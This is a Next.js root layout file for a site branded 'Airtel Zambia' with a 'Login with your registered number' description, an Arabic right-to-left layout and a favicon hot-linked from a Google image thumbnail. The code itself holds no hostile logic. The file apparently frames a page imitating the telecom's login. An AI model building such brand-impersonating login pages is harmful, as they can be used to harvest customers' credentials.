import type React from "react"
import type { Metadata } from "next"
import { Cairo } from "next/font/google"
import "./globals.css"

const cairo = Cairo({
  subsets: ["arabic", "latin"],
  weight: ["400", "500", "600", "700", "800"],
  variable: "--font-cairo",
})

export const metadata: Metadata = {
  title: "Airtel Zambia - Welcome to Airtel",
  description: "Welcome to Airtel Zambia - Login with your registered number",
  icons: {
    icon: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTuUIYILCH57PwwcpNDvCJfl0Fw53NfBSKqOpReSVfSJMDiw4OO8w&s&ec=121966380",
  },
}

export const viewport = {
  width: 'device-width',
  initialScale: 1,
  maximumScale: 1,
  userScalable: false,
  interactiveWidget: 'overlays-content',
  viewportFit: 'cover',
}

export default function RootLayout({
  children,
}: Readonly<{
  children: React.ReactNode
}>) {
  return (
    <html lang="ar" dir="rtl" className={cairo.variable}>
      <body className={`${cairo.className} antialiased bg-white text-slate-900`}>
        {children}
      </body>
    </html>
  )
}
